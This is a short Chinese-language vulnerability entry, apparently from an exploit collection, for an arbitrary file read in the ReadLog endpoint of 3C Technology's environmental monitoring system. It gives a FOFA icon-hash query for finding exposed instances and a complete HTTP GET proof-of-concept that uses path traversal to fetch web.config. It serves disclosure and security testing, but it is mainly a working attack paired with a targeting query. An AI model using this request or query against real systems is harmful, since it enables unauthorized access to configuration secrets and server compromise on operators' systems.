# 3C环境自动监测监控系统ReadLog文件读取漏洞

3C科技环境自动监测监控系统ReadLog读取报错日志功能点不受访问控制限制，存在任意文件读取漏洞。未经授权的攻击者可以读取服务器上的任意文件,从而获取系统权限和敏感信息。 

## fofa

```yaml
icon_hash="-338936081"
```

![image-20240801191240895](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408011912982.png)

## poc

```yaml
GET /ajax/sys/LogService.ashx?Method=ReadLog&FileName=../web.config HTTP/1.1
Host: 
Accept: text/plain, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http:/{{Hostname}}/Sys/Log/FileLogList.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20240801191259831](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408011912877.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/CKJO9RohFllYOSnfdu_7Xw